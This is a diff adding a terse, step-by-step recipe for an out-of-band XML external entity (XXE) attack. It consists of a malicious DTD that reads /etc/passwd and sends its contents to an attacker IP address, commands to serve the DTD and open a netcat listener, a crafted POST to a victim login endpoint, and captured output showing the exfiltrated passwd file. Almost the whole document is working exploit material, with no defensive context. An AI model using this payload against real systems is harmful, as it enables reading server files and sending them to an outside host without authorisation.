@@ -1,0 +1,31 @@
+1. create test.dtd file:
+
+<!ENTITY % p1 SYSTEM "file:///etc/passwd">
+<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://192.250.230.182:3001/BLAH?%p1;'>">
+%p2;
+
+2. spawn http server: to serve test.dtd
+$ python -m SimpleHTTPServer 3000
+
+3. submit POST request via repeater to victim:
+
+POST /login HTTP/1.1
+Host: vulnerablevictim.com
+Connection: close
+Content-Type: text/xml
+Content-Length: 97
+
+<?xml version="1.0"?>
+<!DOCTYPE foo SYSTEM "http://192.250.230.182:3000/test.dtd">
+<foo>&e1;</foo>
+
+4. spawn nc listener (remeber to restart after every attempt)
+$nc -l -p 3001
+
+5. output should show:
+
+GET /BLAH?root:x:0:0:root:/root:/bin/bash%0Adaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin%0Abin:x:2:2:bin:/bin:/usr/sbin/nologin%0Asys:x:3:3:sys:/dev:/usr/sbin/nologin%0Async:x:4:65534:sync:/bin:/bin/sync%0Agames:x:5:60:games:/usr/games:/usr/sbin/nologin%0Aman:x:6:12:man:/var/cache/man:/usr/sbin/nologin%0Alp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin%0Amail:x:8:8:mail:/var/mail:/usr/sbin/nologin%0Anews:x:9:9:news:/var/spool/news:/usr/sbin/nologin%0Auucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin%0Aproxy:x:13:13:proxy:/bin:/usr/sbin/nologin%0Awww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin%0Abackup:x:34:34:backup:/var/backups:/usr/sbin/nologin%0Alist:x:38:38:Mailing%20List%20Manager:/var/list:/usr/sbin/nologin%0Airc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin%0Agnats:x:41:41:Gnats%20Bug-Reporting%20System%20(admin):/var/lib/gnats:/usr/sbin/nologin%0Anobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin%0Asystemd-timesync:x:100:103:systemd%20Time%20Synchronization,,,:/run/systemd:/bin/false%0Asystemd-network:x:101:104:systemd%20Network%20Management,,,:/run/systemd/netif:/bin/false%0Asystemd-resolve:x:102:105:systemd%20Resolver,,,:/run/systemd/resolve:/bin/false%0Asystemd-bus-proxy:x:103:106:systemd%20Bus%20Proxy,,,:/run/systemd:/bin/false%0Amysql:x:104:107:MySQL%20Server,,,:/nonexistent:/bin/false%0Aplay:x:1000:1000::/home/play:/bin/bash%0A HTTP/1.1
+User-Agent: Java/1.7.0
+Host: 192.250.230.182:3001
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
